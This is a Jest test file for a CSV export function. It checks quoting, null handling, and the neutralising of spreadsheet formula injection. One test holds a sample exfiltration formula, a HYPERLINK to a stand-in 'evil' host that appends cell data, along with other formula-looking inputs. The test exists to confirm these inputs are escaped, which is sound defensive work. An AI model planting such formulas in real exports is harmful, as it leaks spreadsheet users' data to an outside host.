import { toCsv } from '../../src/domain/csv';

describe('toCsv', () => {
  it('joins headers + rows with CRLF', () => {
    const out = toCsv(
      ['a', 'b'],
      [
        [1, 2],
        [3, 4],
      ],
    );
    expect(out).toBe('a,b\r\n1,2\r\n3,4');
  });

  it('quotes cells with commas, quotes, or newlines and doubles embedded quotes', () => {
    const out = toCsv(
      ['name', 'note'],
      [
        ['Doe, John', 'says "hi"'],
        ['multi\nline', 'ok'],
      ],
    );
    expect(out).toBe('name,note\r\n"Doe, John","says ""hi"""\r\n"multi\nline",ok');
  });

  it('renders null/undefined as empty and leaves plain values unquoted', () => {
    expect(toCsv(['x', 'y', 'z'], [['plain', null, undefined]])).toBe('x,y,z\r\nplain,,');
  });

  it('HR-22: neutralises formula-looking text so a spreadsheet will not evaluate it', () => {
    const out = toCsv(
      ['name'],
      [['=HYPERLINK("http://evil/?"&A1)'], ['+1+1'], ['-2+3'], ['@SUM(A1)'], ['\t=CMD']],
    );
    const lines = out.split('\r\n');
    expect(lines[1]).toBe(`"'=HYPERLINK(""http://evil/?""&A1)"`);
    expect(lines.slice(2, 5)).toEqual(["'+1+1", "'-2+3", "'@SUM(A1)"]);
    expect(lines[5]).toBe("'\t=CMD");
  });

  it('HR-22: real numbers, including negatives, stay numbers', () => {
    expect(toCsv(['n'], [[-5], [0], [12.5]])).toBe('n\r\n-5\r\n0\r\n12.5');
  });
});
